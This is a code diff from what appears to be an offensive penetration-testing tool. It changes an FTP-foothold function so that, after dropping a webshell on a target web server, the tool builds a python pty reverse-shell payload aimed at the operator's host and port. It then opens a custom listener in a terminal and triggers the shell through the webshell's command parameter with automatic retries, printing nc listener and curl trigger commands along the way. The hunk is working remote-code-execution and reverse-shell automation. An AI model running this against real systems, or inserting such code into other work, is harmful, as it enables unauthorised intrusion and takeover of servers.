@@ -11113,21 +11113,49 @@ def _ftp_fh_webrce(ip: str, port: int, proto: str) -> str:
     except Exception as exc:                                 # noqa: BLE001
         print(f"{RED}✗ could not drop webshell: {exc}{RESET}")
         return "ftp-foothold: webshell drop failed"
-    revsh = _REVSHELLS[0][2].replace("{ip}", lhost).replace("{port}", str(lport))
+    import time
+    import tempfile
     import urllib.parse
+    rlabel, _need, rtpl, rpty = _REVSHELLS[0]                 # python3 pty
+    revsh = rtpl.replace("{ip}", lhost).replace("{port}", str(lport))
+    https = urlbase.startswith("https")
+    mport = re.search(r"//[^/]+?:(\d+)", urlbase)             # explicit :port on the served URL
+    web_port = int(mport.group(1)) if mport else (443 if https else 80)
+    path_q = f"/{shell}?c={urllib.parse.quote(revsh)}"
     trigger = f"{urlbase}/{shell}?c={urllib.parse.quote(revsh)}"
     print(f"{GREEN}✓ webshell dropped:{RESET} {urlbase}/{shell}  {DIM}(artifact — delete via FTP after){RESET}")
-    lt = _open_shell_terminal(f"nc -lvnp {lport}")
-    if lt:
-        print(f"{GREEN}▶ listener nc -lvnp {lport} in a new {lt} window{RESET} {DIM}(LHOST {lhost}){RESET}")
-    else:
-        print(f"{YELLOW}headless{RESET} — start a listener: {BOLD}nc -lvnp {lport}{RESET}")
-    print(f"{DIM}firing reverse shell via:{RESET}\n  {BOLD}curl '{trigger}'{RESET}")
-    try:
-        _http_get(ip, int(re.search(r":(\d+)", urlbase).group(1)) if ":" in urlbase else 80,
-                  f"/{shell}?c={urllib.parse.quote(revsh)}", urlbase.startswith("https"))
-    except Exception:                                        # noqa: BLE001
-        pass
+
+    # smart auto-upgrading listener (same engine as the HTTP foothold) — not plain nc
+    upgrade = b"" if rpty else _FOOTHOLD_UPGRADE.encode()
+    src = (_SMART_LISTENER_SRC.replace("__LPORT__", str(lport))
+           .replace("__UPGRADE__", repr(upgrade)))
+    fd, spath = tempfile.mkstemp(prefix="pshunter_listener_", suffix=".py")
+    with os.fdopen(fd, "w") as fh:
+        fh.write(src)
+    used = _open_listener_terminal(spath)
+
+    def _fire():
+        try:
+            _http_get(ip, web_port, path_q, https)
+        except Exception:                                    # noqa: BLE001
+            pass
+
+    if not used:
+        _safe_unlink(spath)
+        print(f"{YELLOW}headless — no terminal to open.{RESET} Start a listener yourself:")
+        print(f"  {BOLD}nc -lvnp {lport}{RESET}   {DIM}(on {lhost}){RESET}")
+        print(f"then fire the shell:\n  {BOLD}curl '{trigger}'{RESET}")
+        return f"ftp-foothold: web-rce headless — trigger shown ({urlbase}/{shell})"
+
+    print(f"{GREEN}▶ smart listener opened in a new terminal{RESET} {DIM}({used}) on {lhost}:{lport}{RESET}")
+    print(f"  {DIM}firing {rlabel} through the webshell (auto-retry)…{RESET}")
+    time.sleep(1.5)                                          # let the listener bind first
+    for _ in range(3):                                       # auto-retry: beat the bind race / packet loss
+        _fire()
+        time.sleep(1.0)
+    print(f"  {DIM}→ check the new terminal for your{RESET} "
+          f"{GREEN}{'pty' if rpty else 'auto-upgraded'} shell{RESET}"
+          f"{DIM}; if nothing landed, re-fire:{RESET} {BOLD}curl '{trigger}'{RESET}")
     return f"ftp-foothold: web-rce shell → {lhost}:{lport} (via {urlbase}/{shell})"
 
 
